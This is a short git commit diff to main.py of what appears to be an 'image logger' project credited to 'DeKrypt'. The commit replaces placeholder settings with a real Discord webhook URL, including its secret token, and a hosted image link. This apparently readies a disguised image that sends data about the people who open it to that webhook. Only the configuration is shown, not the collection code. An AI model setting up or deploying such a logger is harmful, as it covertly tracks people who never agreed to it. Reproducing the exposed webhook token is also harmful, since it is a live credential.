e3a741e601468d1552b82ae7f478f976050915a1
flight-js <109524102+flight-js@users.noreply.github.com>
2024-01-05 23:43:26 +0100

    Update main.py

--- main.py
+++ main.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1192956131023270020/RF9xVzqxFsZh_8gAoFj0Sfmw8YXWTGGIESNxOZXmEeI0zfF7JOJwNawiMEc-sLCSFd6j",
+    "image": "https://static.wikia.nocookie.net/c88308f3-e20e-41ca-a94a-e715b56e2b6b/scale-to-width/755", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
